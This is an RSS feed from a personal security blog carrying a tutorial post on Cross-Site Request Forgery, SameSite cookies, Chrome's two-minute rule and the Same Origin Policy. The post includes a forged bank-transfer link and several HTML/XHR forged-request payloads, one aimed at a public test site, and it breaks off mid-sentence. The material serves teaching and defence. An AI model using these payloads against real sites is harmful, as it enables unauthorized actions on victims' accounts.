<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>chaos</title>
    <link>https://mychaos.me/</link>
    <description>Recent content on chaos</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 10 Aug 2023 12:29:44 +0100</lastBuildDate><atom:link href="https://mychaos.me/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CSRF</title>
      <link>https://mychaos.me/posts/csrf/</link>
      <pubDate>Thu, 10 Aug 2023 12:29:44 +0100</pubDate>
      
      <guid>https://mychaos.me/posts/csrf/</guid>
      <description>CSRF is an attack that tricks the victim into submitting a malicious request.
 What is Cross-Site Request Forgery (CSRF)? Cross-Site Request Forgery (CSRF) is an attack that tricks users of a web application into unknowingly performing unwanted actions while they are authenticated. This type of attack targets requests that change the application&amp;rsquo;s state, rather than stealing data. Because the attacker cannot see the response to the forged request, they rely on social engineering techniques, such as sending malicious links via email or chat, to deceive users into executing actions of the attacker&amp;rsquo;s choosing.</description>
      <content>&lt;blockquote&gt;
&lt;p&gt;CSRF is an attack that tricks the victim into submitting a malicious request.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;what-is-cross-site-request-forgery-csrf&#34;&gt;What is Cross-Site Request Forgery (CSRF)?&lt;/h3&gt;
&lt;p&gt;Cross-Site Request Forgery (CSRF) is an attack that tricks users of a web application into unknowingly performing unwanted actions while they are authenticated. This type of attack targets requests that change the application&amp;rsquo;s state, rather than stealing data. Because the attacker cannot see the response to the forged request, they rely on social engineering techniques, such as sending malicious links via email or chat, to deceive users into executing actions of the attacker&amp;rsquo;s choosing.&lt;/p&gt;
&lt;div align=&#34;center&#34;&gt;
    &lt;img src=&#34;https://i.ibb.co/C9xLpKY/pinterestdownloader-com-1691670824-925069.jpg&#34; alt=&#34;Image&#34; width=&#34;600&#34; /&gt;
  &lt;/div&gt;
  
&lt;h3 id=&#34;impact-of-csrf-attacks&#34;&gt;Impact of CSRF attacks:&lt;/h3&gt;
&lt;p&gt;If the victim is a regular user, a successful CSRF attack can lead to state-changing requests being performed without their consent. This can include actions like transferring funds, changing their email address, or giving an attacker access to their data. On the other hand, if the victim has an administrative account, a CSRF attack can compromise the entire web application.&lt;/p&gt;
&lt;h3 id=&#34;understanding-csrf-attacks&#34;&gt;Understanding CSRF Attacks&lt;/h3&gt;
&lt;p&gt;Cross-Site Request Forgery (CSRF) attacks allow attackers to bypass authentication processes or perform actions with elevated privileges. To execute this type of attack, the attacker must:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Create a custom payload.&lt;/li&gt;
&lt;li&gt;Embed the request into a hyperlink.&lt;/li&gt;
&lt;li&gt;Trick the victim into clicking the link, which sends the request to the website.&lt;/li&gt;
&lt;li&gt;Forge the request to conduct malicious actions.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;CSRF attacks only work if the victim is an authenticated user. This is because, when the request is made, the application checks if valid session cookies are available. If relevant cookies are available and sent with the request, and the website approves them, the CSRF attack will be successful.&lt;/p&gt;
&lt;h3 id=&#34;csrf-attack-example&#34;&gt;CSRF Attack Example&lt;/h3&gt;
&lt;p&gt;Let&amp;rsquo;s say that a user is logged into their bank account and wants to transfer money to another account. The user&amp;rsquo;s bank uses a GET request to transfer funds, which is vulnerable to CSRF attacks. The attacker creates a malicious link like this:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://bank.com/transfer?to=attacker&amp;amp;amount=1000&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;when clicked, transfers money from the victim&amp;rsquo;s account to the attacker&amp;rsquo;s account. The attacker then sends the link to the victim via email or chat. If the victim clicks the link, the request is sent to the bank&amp;rsquo;s website, which approves the request because the victim is already authenticated. The attacker receives the money, and the victim is none the wiser.
If the attacker is sending the payload with a POST request, a payload similar to the following HTML code can be used:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;action&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://bank.co m/transfer&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;post&amp;#34;&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Transaction&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;withdraw&amp;#34;&lt;/span&gt; /&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Amount&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3000000&amp;#34;&lt;/span&gt; /&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Click&amp;#34;&lt;/span&gt;/&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;When using the &amp;ldquo;bank.com/transfer&amp;rdquo; endpoint to perform a transfer action, the &amp;ldquo;Transaction&amp;rdquo; and &amp;ldquo;Amount&amp;rdquo; parameters are passed via a POST request. Since this endpoint doesn&amp;rsquo;t require a random CSRF token, an attacker can put HTML code on &amp;ldquo;attacker.com,&amp;rdquo; send the link to the victim, and initiate a transfer once the victim opens the link. This attack is possible due to the lack of mandatory CSRF token.&lt;/p&gt;
&lt;h3 id=&#34;what-is-csrf-token&#34;&gt;what is CSRF token?&lt;/h3&gt;
&lt;p&gt;A CSRF token is a unique, secret, unpredictable value that is generated by the server-side application and transmitted to the client in such a way that it is included in a subsequent HTTP request made by the client. When the later request is made, the server-side application validates that the request includes the expected token and rejects the request if the token is missing or invalid.&lt;/p&gt;
&lt;h3 id=&#34;is-csrf-simple-as-it-looks&#34;&gt;is CSRF simple as it looks?&lt;/h3&gt;
&lt;p&gt;When the victim opens the link, the transfer occurs. Right?&lt;/p&gt;
&lt;p&gt;Well, it&amp;rsquo;s not that simple.&lt;/p&gt;
&lt;p&gt;There are various scenarios to consider. For instance, if the victim is using Chrome browser, it won&amp;rsquo;t work. However, if they are using Safari, it would work. So, can we conclude that CSRF doesn&amp;rsquo;t occur in Chrome anymore? No. It depends on whether the victim logged in to &lt;code&gt;bank.com&lt;/code&gt; within the last two minutes. If they did, the transfer will work. If more than two minutes have passed, it won&amp;rsquo;t.&lt;/p&gt;
&lt;p&gt;Furthermore, whether the &amp;ldquo;bank.com/transfer&amp;rdquo; endpoint accepts the content-type as &amp;ldquo;text/html&amp;rdquo; determines whether it will work or not. If it only accepts &amp;ldquo;application/json,&amp;rdquo; it won&amp;rsquo;t work.&lt;/p&gt;
&lt;div align=&#34;center&#34;&gt;
    &lt;img src=&#34;https://i.pinimg.com/originals/f1/60/94/f160944c79c3d9ea8acc36f007f45c6b.jpg&#34; alt=&#34;Image&#34; width=&#34;350&#34; /&gt;
  &lt;/div&gt;
  
&lt;p&gt;I understand that it may be confusing. To understand these scenarios, we must first grasp two concepts: SameSite Cookies and Same Origin Policy. Let&amp;rsquo;s break it down step by step.&lt;/p&gt;
&lt;h3 id=&#34;samesite-cookies&#34;&gt;SameSite Cookies&lt;/h3&gt;
&lt;p&gt;SameSite is a cookie attribute, similar to HttpOnly and Secure. Its purpose is to address the main vulnerability exploited by CSRF attacks. By default, when you send a request from a.com to b.com, the browser includes your cookies for b.com in the request. As a result, when the attacker&amp;rsquo;s code on evil.com sends a money transfer request to bank.com, the browser sends an authenticated request to bank.com, leading to the successful transfer.&lt;/p&gt;
&lt;p&gt;If the browser fails to add the cookie to the request, it poses a problem. Let&amp;rsquo;s consider a scenario where a victim logs in to bank.com, then visits evil.com. Inside evil.com, a transfer request is sent to bank.com. However, because the browser doesn&amp;rsquo;t include cookies, the request lacks the necessary authentication, resulting in the transfer not taking place.&lt;/p&gt;
&lt;p&gt;To address this issue, a concept called &amp;ldquo;SameSite&amp;rdquo; has been introduced. The SameSite cookie attribute offers three possible values:&lt;/p&gt;
&lt;p&gt;Lax: Cookies are not sent with normal cross-site requests, unless the user is navigating to the original site (e.g., by following a link).&lt;/p&gt;
&lt;p&gt;Strict: Cookies are only sent in a first-party context and are not included in requests initiated by third-party websites.&lt;/p&gt;
&lt;p&gt;None: Cookies are sent in all contexts, regardless of whether the request is cross-site or first-party.&lt;/p&gt;
&lt;p&gt;Developers have the option to set Lax or Strict flags as protection against CSRF attacks. However, what happens if they neglect to do so? Let&amp;rsquo;s refer back to our previous example:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;quot;if the victim is using Chrome browser, it won&#39;t work. However, if they are using Safari, it would work.&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The reason behind this is that the Chrome browser automatically applies a default SameSite value (Lax) to cookies. As a result, even if the developer is unaware of CSRF or SameSite cookies, their websites are still safeguarded, and CSRF attacks are prevented. Let&amp;rsquo;s put this to the test.&lt;/p&gt;
&lt;p&gt;Using the Chrome browser, navigate to &lt;a href=&#34;https://authenticationtest.com/simpleFormAuth/&#34;&gt;https://authenticationtest.com/simpleFormAuth/&lt;/a&gt; and complete the form by entering the provided username and password values.&lt;/p&gt;
&lt;p&gt;Once logged in, the application will generate a session cookie. You can verify its presence in Chrome&amp;rsquo;s developer console. Notably, the cookie does not contain a SameSite attribute.&lt;/p&gt;
&lt;div align=&#34;center&#34;&gt;
    &lt;img src=&#34;https://i.ibb.co/XJq6y30/image-2023-08-10-154220483.png&#34; alt=&#34;Image&#34; width=&#34;1000&#34; /&gt;
  &lt;/div&gt;
  
&lt;p&gt;There is a form that we can test at &lt;a href=&#34;https://authenticationtest.com/xssDemo/&#34;&gt;https://authenticationtest.com/xssDemo/&lt;/a&gt; .
Just fill the textbox and click the “Search” button.
It generates a POST request and the request doesn’t contain a random CSRF-token. So in theory, we can conduct a CSRF attack there.&lt;/p&gt;
&lt;p&gt;Save the following HTML snippet as csrf.html and open it in the same Chrome browser that you logged in.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
 &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
 &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;history&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;pushState&lt;/span&gt;(&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;‘’&lt;/span&gt;, &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;‘’&lt;/span&gt;, &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;‘&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;’&lt;/span&gt;)&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
 &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;action&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;”https://authenticationtest.com/xssDemo/&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;”POST”&lt;/span&gt;&amp;gt;
 &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;”hidden”&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;”search”&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;”requestTest”&lt;/span&gt; /&amp;gt;
 &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;”submit”&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;”Submit&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;request&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”&lt;/span&gt; /&amp;gt;
 &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt;&amp;gt;
 &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Open Chrome&amp;rsquo;s developer console and go to the &amp;ldquo;Network&amp;rdquo; section. Then, click the &amp;ldquo;Submit Request&amp;rdquo; button. what happened? the POST request sent with our authentication cookie.&lt;/p&gt;
&lt;div align=&#34;center&#34;&gt;
    &lt;img src=&#34;https://i.ibb.co/280qLYS/image-2023-08-10-160541677.png&#34; alt=&#34;Image&#34; width=&#34;1000&#34; /&gt;
  &lt;/div&gt;
  
&lt;p&gt;Was that wrong? Does Chrome not always set the Lax attribute? If it doesn&amp;rsquo;t, then this request shouldn&amp;rsquo;t have the cookie.&lt;/p&gt;
&lt;p&gt;Now things get a bit tricky. Let&amp;rsquo;s remember what I showed you earlier:&lt;/p&gt;
&lt;p&gt;&amp;ldquo;If the user logged into bank.com just 2 minutes ago, the CSRF attack will work. But if it&amp;rsquo;s been more than 2 minutes, the CSRF attack won&amp;rsquo;t work.&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Basically, Chrome only sends the cookie within 2 minutes of authentication; after that, it stops sending it.&lt;/p&gt;
&lt;div align=&#34;center&#34;&gt;
    &lt;img src=&#34;https://i.pinimg.com/originals/19/98/2b/19982b821761e764b7f90d440ee1247a.jpg&#34; alt=&#34;Image&#34; width=&#34;350&#34; /&gt;
  &lt;/div&gt;
  
&lt;p&gt;Please wait for 2 minutes before resending the request using csrf.html. Notice any changes? This time, the request doesn&amp;rsquo;t include the cookie.&lt;/p&gt;
&lt;div align=&#34;center&#34;&gt;
    &lt;img src=&#34;https://i.ibb.co/NTCFgfb/image-2023-08-10-161748778.png&#34; alt=&#34;Image&#34; width=&#34;1000&#34; /&gt;
  &lt;/div&gt;
  
&lt;p&gt;why there is such a behavior? When Chrome started to set SameSite attribute to Lax by default, it caused issues with certain aspects of the web.&lt;/p&gt;
&lt;p&gt;Certain applications like OAuth, OpenID, and payment gateways depend on cross-site requests for their functioning. Without this capability, the entire process breaks. To address this, Chrome developers introduced a temporary solution known as the &amp;ldquo;2-minute rule.&amp;rdquo; This rule allows these processes to operate smoothly. However, it&amp;rsquo;s important to note that this solution is only temporary, and the upcoming change will make SameSite=Lax the default setting for all scenarios.&lt;/p&gt;
&lt;p&gt;So, if the victim uses a Safari browser and the “bank.com/transfer” endpoint doesn’t require any CSRF tokens, we can exploit it, right.&lt;/p&gt;
&lt;p&gt;Well, it&amp;rsquo;s not that simple.&lt;/p&gt;
&lt;h3 id=&#34;same-origin-policy&#34;&gt;Same Origin Policy&lt;/h3&gt;
&lt;p&gt;I won&amp;rsquo;t get into all the technical details of the Same Origin Policy, as it can be quite complex. Instead, I&amp;rsquo;ll talk about how it relates to CSRF and clear up a common misconception:&lt;/p&gt;
&lt;p&gt;Some folks think the Same Origin Policy only stops &amp;ldquo;a.com&amp;rdquo; from grabbing data from &amp;ldquo;b.com,&amp;rdquo; but lets requests from &amp;ldquo;a.com&amp;rdquo; go to &amp;ldquo;b.com.&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Actually, that&amp;rsquo;s not entirely correct. The SOP mostly stops data reading, but sometimes it also limits sending data.&lt;/p&gt;
&lt;p&gt;So what kind of requests are allowed?&lt;/p&gt;
&lt;p&gt;It allows sending GET/POST requests through HTML forms. Let’s try the following example:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
 &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
 &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;history&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;pushState&lt;/span&gt;(&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;‘’&lt;/span&gt;, &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;‘’&lt;/span&gt;, &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;‘&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;’&lt;/span&gt;)&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
 
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;action&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;”https://example.com/&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;”POST”&lt;/span&gt;&amp;gt;

 &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;”hidden”&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;”amount”&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;”500&amp;#34;&lt;/span&gt; /&amp;gt;
 &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;”submit”&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;”Submit&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;request&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”&lt;/span&gt; /&amp;gt;
 &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt;&amp;gt;
 &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Request’s content-type will be “application/x-www-form-urlencoded” which is allowed by SOP.
Therefore, the request is sent.&lt;/p&gt;
&lt;div align=&#34;center&#34;&gt;
    &lt;img src=&#34;https://i.ibb.co/TDGnZbh/image-2023-08-10-171723577.png&#34; alt=&#34;Image&#34; width=&#34;1000&#34; /&gt;
  &lt;/div&gt;
  
&lt;p&gt;This feature prevents PUT requests as well as requests with the &amp;ldquo;application/json&amp;rdquo; Content-Type header.&lt;/p&gt;
&lt;p&gt;You cannot initiate PUT or &amp;ldquo;Content-Type: application/json&amp;rdquo; requests using HTML forms. Instead, these require a distinct approach known as a &amp;ldquo;special request.&amp;rdquo; To accomplish this, you can employ the XMLHttpRequest (XHR) method in JavaScript. Let&amp;rsquo;s explore an illustrative example below:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xmlhttp&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;XMLHttpRequest&lt;/span&gt;();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;theUrl&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://mychaos.me/transfer&amp;#34;&lt;/span&gt;;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;xmlhttp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;theUrl&lt;/span&gt;);
        &lt;span style=&#34;color:#a6e22e&#34;&gt;xmlhttp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setRequestHeader&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;application/json;charset=UTF-8&amp;#34;&lt;/span&gt;);

        &lt;span style=&#34;color:#a6e22e&#34;&gt;xmlhttp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;JSON&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;stringify&lt;/span&gt;({ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;amount&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;500&amp;#34;&lt;/span&gt; }));
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The above code will send a POST request to the &amp;ldquo;&lt;a href=&#34;https://mychaos.me/transfer%22&#34;&gt;https://mychaos.me/transfer&amp;quot;&lt;/a&gt; endpoint with the &amp;ldquo;amount&amp;rdquo; parameter set to 500.
The request failed due to “CORS error”. So, what happened behind the scene?&lt;/p&gt;
&lt;p&gt;Since this is an XHR request, the browser sends a “preflight” request to the target website with “OPTIONS” method. The browser makes this request to understand if the target website allows this request. How a website can allow this request?
With Cross-Origin Resource Sharing (CORS) header of course.
If the target website had “Access-Control-Allow-Origin: *” response header, the request would be successful.&lt;/p&gt;
&lt;p&gt;So, we can say that:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If the “bank.com/transfer” endpoint only accepts “application/json” content-type, it doesn’t need any CSRF tokens. The attack won’t work.&lt;/li&gt;
&lt;li&gt;If the “bank.com/transfer” endpoint only accepts “PUT” requests, it doesn’t need any CSRF tokens. The attack won’t work.&lt;/li&gt;
&lt;/ul&gt;
&lt;div align=&#34;center&#34;&gt;
    &lt;img src=&#34;https://i.ibb.co/mt9vXd0/image-2023-08-10-173943705.png&#34; alt=&#34;Image&#34; width=&#34;1000&#34; /&gt;
  &lt;/div&gt;
  
&lt;p&gt;But of course, we shouldn’t forget that there might be wrong implementations on the code base. What if “bank.com/transfer” accepts GET requests as well mistakenly? We can exploit it with:&lt;/p&gt;
